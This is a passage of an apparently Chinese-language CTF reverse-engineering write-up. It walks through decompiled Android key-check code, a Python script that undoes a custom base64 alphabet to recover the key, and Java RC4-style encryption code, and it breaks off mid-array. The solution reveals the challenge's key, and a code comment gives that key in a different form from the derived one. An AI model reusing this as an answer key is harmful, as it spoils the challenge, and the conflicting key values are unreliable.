  &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;((_BYTE &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;)&lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;v15 &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; v6 &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;) &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; aAbcdefghijklmn[&lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;((&lt;span style=&#34;color:#66d9ef&#34;&gt;char&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;)&lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;v22 &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; v6 &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;)];
  &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;(_WORD &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;)((&lt;span style=&#34;color:#66d9ef&#34;&gt;char&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;)&lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;v15 &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; v6 &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;) &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;&amp;#39;&lt;/span&gt;;
LABEL_10:
  (&lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;(&lt;span style=&#34;color:#66d9ef&#34;&gt;void&lt;/span&gt; (&lt;span style=&#34;color:#66d9ef&#34;&gt;__fastcall&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;**&lt;/span&gt;)(&lt;span style=&#34;color:#66d9ef&#34;&gt;__int64&lt;/span&gt;, &lt;span style=&#34;color:#66d9ef&#34;&gt;__int64&lt;/span&gt;, &lt;span style=&#34;color:#66d9ef&#34;&gt;char&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;))(&lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;(_QWORD &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;)a1 &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1360LL&lt;/span&gt;))(a1, v3, v4);
  v12 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; _mm_movemask_epi8(
          _mm_and_si128(
            _mm_cmpeq_epi8(_mm_load_si128((&lt;span style=&#34;color:#66d9ef&#34;&gt;const&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;__m128i&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;)&lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;v15), (&lt;span style=&#34;color:#66d9ef&#34;&gt;__m128i&lt;/span&gt;)xmmword_BE0),
            _mm_cmpeq_epi8(_mm_loadu_si128((&lt;span style=&#34;color:#66d9ef&#34;&gt;const&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;__m128i&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;)((&lt;span style=&#34;color:#66d9ef&#34;&gt;char&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;)&lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;v15 &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;9&lt;/span&gt;)), (&lt;span style=&#34;color:#66d9ef&#34;&gt;__m128i&lt;/span&gt;)xmmword_BD0)));&lt;span style=&#34;color:#75715e&#34;&gt;// 3g6L2PWL2PXFmR+7ise7iq==
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;  __android_log_print(&lt;span style=&#34;color:#ae81ff&#34;&gt;4LL&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;nepnep&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;%s&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;v15);
  result &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0LL&lt;/span&gt;;
  &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; ( v12 &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0xFFFF&lt;/span&gt; )
  {
    __android_log_print(&lt;span style=&#34;color:#ae81ff&#34;&gt;4LL&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;nepnep&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;key is true!&amp;#34;&lt;/span&gt;, v13);
    result &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1LL&lt;/span&gt;;
  }
  &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; result;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;我们的目的肯定是让 &lt;code&gt;v12 = 0FFFF&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;虽然对于 mm 之类的指令不太清楚，但大概的意思应该还是两个字符串相等的，那么就让 &lt;code&gt;(const __m128i *)&amp;amp;v15), (__m128i)xmmword_BE0)&lt;/code&gt; 和 &lt;code&gt;((char *)&amp;amp;v15 + 9)), (__m128i)xmmword_BD0))&lt;/code&gt; 两两相等即可&lt;/p&gt;
&lt;p&gt;在字符串中找到这两个，就能得到 &lt;code&gt;3g6L2PWL2PXFmR+7ise7iq==&lt;/code&gt;，这个看起来是一个 base64，但解出来是乱码，所以还是得往前看。上面一大段从 &lt;code&gt;while&lt;/code&gt; 开始的代码，显然就是 base64 的最后一步，点开字符串，发现这个不是标准的 base64。那么根据这个字符串反向求解 base64 就可以了。&lt;/p&gt;
&lt;p&gt;实际操作时，继续阅读了 &lt;code&gt;sub_820&lt;/code&gt; 和 &lt;code&gt;sub_710&lt;/code&gt; 两个函数。只看 &lt;code&gt;sub_820&lt;/code&gt; 的话看不太懂，建议先看 &lt;code&gt;sub_710&lt;/code&gt;，发现 &lt;code&gt;sub_710&lt;/code&gt; 中，将一个字符串的每个字符根据 ascii 数值直接拆开到了八个 char 上，每个 char 存 &lt;code&gt;&#39;0&#39;&lt;/code&gt; 或 &lt;code&gt;&#39;1&#39;&lt;/code&gt; （ &lt;code&gt;0x30&lt;/code&gt; 和 &lt;code&gt;0x31&lt;/code&gt; ）。到了 &lt;code&gt;sub_820&lt;/code&gt; 函数，则每六个进行合并，每一位运算看起来很奇怪，但如果用 &lt;code&gt;0x30&lt;/code&gt; 和 &lt;code&gt;0x31&lt;/code&gt; 带入会发现就是很简单的将 0 和1 重新组合起来。就是做了一个 base64 运算。&lt;/p&gt;
&lt;p&gt;于是写个代码反向求解就可以了&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; string
&lt;span style=&#34;color:#f92672&#34;&gt;from&lt;/span&gt; libnum &lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; s2n
&lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; base64

en_key &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;7+RmFXP2LWP2L6g3&amp;#39;&lt;/span&gt;[::&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;==qi7esi&amp;#39;&lt;/span&gt;[::&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;]
true_base &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; string&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;ascii_uppercase &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; string&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;ascii_lowercase &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; string&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;digits &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;+/&amp;#39;&lt;/span&gt;
fake_base &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; string&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;ascii_lowercase &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; string&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;digits &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;+/&amp;#39;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; string&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;ascii_uppercase
key &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&amp;#39;&lt;/span&gt;
&lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; c &lt;span style=&#34;color:#f92672&#34;&gt;in&lt;/span&gt; en_key:
    &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; c &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;=&amp;#39;&lt;/span&gt;:
        key &lt;span style=&#34;color:#f92672&#34;&gt;+=&lt;/span&gt; c
        &lt;span style=&#34;color:#66d9ef&#34;&gt;continue&lt;/span&gt;
    key &lt;span style=&#34;color:#f92672&#34;&gt;+=&lt;/span&gt; true_base[fake_base&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;index(c)]

key &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; base64&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;b64decode(key)
print(key)
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;得到 key: &lt;code&gt;th1s_1s_k3y!!!!!&lt;/code&gt;&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;这里我因为打错了base的字符串，卡了整整一天（&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;接下来就可以去求明文密码了&lt;/p&gt;
&lt;p&gt;继续阅读 java 代码&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-java&#34; data-lang=&#34;java&#34;&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;public&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;class&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;Encrypt&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;{&lt;/span&gt;
    &lt;span style=&#34;color:#66d9ef&#34;&gt;public&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;Encrypt&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;()&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;{&lt;/span&gt;
        &lt;span style=&#34;color:#66d9ef&#34;&gt;super&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;();&lt;/span&gt;
    &lt;span style=&#34;color:#f92672&#34;&gt;}&lt;/span&gt;

    &lt;span style=&#34;color:#66d9ef&#34;&gt;public&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;void&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;en1&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;[]&lt;/span&gt; arg6&lt;span style=&#34;color:#f92672&#34;&gt;,&lt;/span&gt; String arg7&lt;span style=&#34;color:#f92672&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; arg8&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;{&lt;/span&gt;
        &lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; v0 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; 0x100&lt;span style=&#34;color:#f92672&#34;&gt;;&lt;/span&gt;
        &lt;span style=&#34;color:#66d9ef&#34;&gt;byte&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;[]&lt;/span&gt; v1 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;new&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;byte&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;v0&lt;span style=&#34;color:#f92672&#34;&gt;];&lt;/span&gt;
        &lt;span style=&#34;color:#66d9ef&#34;&gt;byte&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;[]&lt;/span&gt; v7 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; arg7&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;getBytes&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;();&lt;/span&gt;
        &lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; v2 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; 0&lt;span style=&#34;color:#f92672&#34;&gt;;&lt;/span&gt;
        &lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; v3&lt;span style=&#34;color:#f92672&#34;&gt;;&lt;/span&gt;
        &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;v3 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; 0&lt;span style=&#34;color:#f92672&#34;&gt;;&lt;/span&gt; v3 &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&lt;/span&gt; v0&lt;span style=&#34;color:#f92672&#34;&gt;;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;++&lt;/span&gt;v3&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;{&lt;/span&gt;
            arg6&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;v3&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; 0x100 &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; v3&lt;span style=&#34;color:#f92672&#34;&gt;;&lt;/span&gt;  &lt;span style=&#34;color:#75715e&#34;&gt;// 256-1降序
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;            v1&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;v3&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; v7&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;v3 &lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt; arg8&lt;span style=&#34;color:#f92672&#34;&gt;];&lt;/span&gt;  &lt;span style=&#34;color:#75715e&#34;&gt;// 用密钥填满v1
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;        &lt;span style=&#34;color:#f92672&#34;&gt;}&lt;/span&gt;

        &lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; v7_1 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; 0&lt;span style=&#34;color:#f92672&#34;&gt;;&lt;/span&gt;
        &lt;span style=&#34;color:#66d9ef&#34;&gt;while&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;v2 &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&lt;/span&gt; v0&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;{&lt;/span&gt;
            v7_1 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;arg6&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;v2&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; v7_1 &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; v1&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;v2&lt;span style=&#34;color:#f92672&#34;&gt;])&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt; 0x100&lt;span style=&#34;color:#f92672&#34;&gt;;&lt;/span&gt;
            arg8 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; arg6&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;v2&lt;span style=&#34;color:#f92672&#34;&gt;];&lt;/span&gt;
            arg6&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;v2&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; arg6&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;v7_1&lt;span style=&#34;color:#f92672&#34;&gt;];&lt;/span&gt;
            arg6&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;v7_1&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; arg8&lt;span style=&#34;color:#f92672&#34;&gt;;&lt;/span&gt;
            &lt;span style=&#34;color:#f92672&#34;&gt;++&lt;/span&gt;v2&lt;span style=&#34;color:#f92672&#34;&gt;;&lt;/span&gt;
        &lt;span style=&#34;color:#f92672&#34;&gt;}&lt;/span&gt;
    &lt;span style=&#34;color:#f92672&#34;&gt;}&lt;/span&gt;

    &lt;span style=&#34;color:#66d9ef&#34;&gt;public&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;void&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;en2&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;[]&lt;/span&gt; arg7&lt;span style=&#34;color:#f92672&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;byte&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;[]&lt;/span&gt; arg8&lt;span style=&#34;color:#f92672&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; arg9&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;{&lt;/span&gt;
        &lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; v0 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; 0&lt;span style=&#34;color:#f92672&#34;&gt;;&lt;/span&gt;
        &lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; v1 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; 0&lt;span style=&#34;color:#f92672&#34;&gt;;&lt;/span&gt;
        &lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; v2 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; 0&lt;span style=&#34;color:#f92672&#34;&gt;;&lt;/span&gt;
        &lt;span style=&#34;color:#66d9ef&#34;&gt;while&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;v0 &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&lt;/span&gt; arg9&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;{&lt;/span&gt;
            v1 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;v1 &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; 1&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt; 0x100&lt;span style=&#34;color:#f92672&#34;&gt;;&lt;/span&gt;
            v2 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;((&lt;/span&gt;arg7&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;v1&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt; 0xFF&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; v2&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt; 0x100&lt;span style=&#34;color:#f92672&#34;&gt;;&lt;/span&gt;
            &lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; v3 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; arg7&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;v1&lt;span style=&#34;color:#f92672&#34;&gt;];&lt;/span&gt;
            arg7&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;v1&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; arg7&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;v2&lt;span style=&#34;color:#f92672&#34;&gt;];&lt;/span&gt;
            arg7&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;v2&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; v3&lt;span style=&#34;color:#f92672&#34;&gt;;&lt;/span&gt;
            arg8&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;v0&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;((&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;byte&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;)(&lt;/span&gt;arg8&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;v0&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;^&lt;/span&gt; arg7&lt;span style=&#34;color:#f92672&#34;&gt;[((&lt;/span&gt;arg7&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;v1&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt; 0xFF&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;arg7&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;v2&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt; 0xFF&lt;span style=&#34;color:#f92672&#34;&gt;))&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt; 0x100&lt;span style=&#34;color:#f92672&#34;&gt;]));&lt;/span&gt;
            &lt;span style=&#34;color:#f92672&#34;&gt;++&lt;/span&gt;v0&lt;span style=&#34;color:#f92672&#34;&gt;;&lt;/span&gt;
        &lt;span style=&#34;color:#f92672&#34;&gt;}&lt;/span&gt;
    &lt;span style=&#34;color:#f92672&#34;&gt;}&lt;/span&gt;

    &lt;span style=&#34;color:#66d9ef&#34;&gt;public&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;boolean&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;file&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;byte&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;[]&lt;/span&gt; arg6&lt;span style=&#34;color:#f92672&#34;&gt;,&lt;/span&gt; String arg7&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;{&lt;/span&gt;  &lt;span style=&#34;color:#75715e&#34;&gt;// passwd, key = &amp;#39;th1s_1s_k3ya!!!!&amp;#39;
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;        &lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;[]&lt;/span&gt; v0 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;new&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;0x100&lt;span style=&#34;color:#f92672&#34;&gt;];&lt;/span&gt;
        &lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; v1 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; 17&lt;span style=&#34;color:#f92672&#34;&gt;;&lt;/span&gt;
        &lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;[]&lt;/span&gt; v2 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;new&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;[]{&lt;/span&gt;0x8B&lt;span style=&#34;color:#f92672&#34;&gt;,&lt;/span&gt; 0xD2&lt;span style=&#34;color:#f92672&#34;&gt;,&lt;/span&gt; 0xD9&lt;span style=&#34;color:#f92672&#34;&gt;,&lt;/span&gt; 0x5D&lt;span style=&#34;color:#f92672&#34;&gt;,&lt;/span&gt; 0x95&lt;span style=&#34;color:#f92672&#34;&gt;,&lt;/span&gt; 0xFF&lt;span style=&#34;color:#f92672&#34;&gt;,&lt;/span&gt; 0x7E&lt;span style=&#34;color:#f92672&#34;&gt;,&lt;/span&gt; 0x5F&lt;span style=&#34;color:#f92672&#34;&gt;,&lt;/span&gt; 0x29&lt;span style=&#34;color:#f92672&#34;&gt;,&lt;/span&gt; 0x56&lt;span style=&#34;color:#f92672&#34;&gt;,&lt;/span&gt; 0x12&lt;span style=&#34;color:#f92672&#34;&gt;,&lt;/span&gt; 0xB9&lt;span style=&#34;color:#f92672&#34;&gt;,&lt;/span&gt; 0xEF&lt;span style=&#34;color:#f92672&#34;&gt;,&lt;/span&gt; 0xEC&lt;span style=&#34;color:#f92672&#34;&gt;,&lt;/span&gt; 0x8B&lt;span 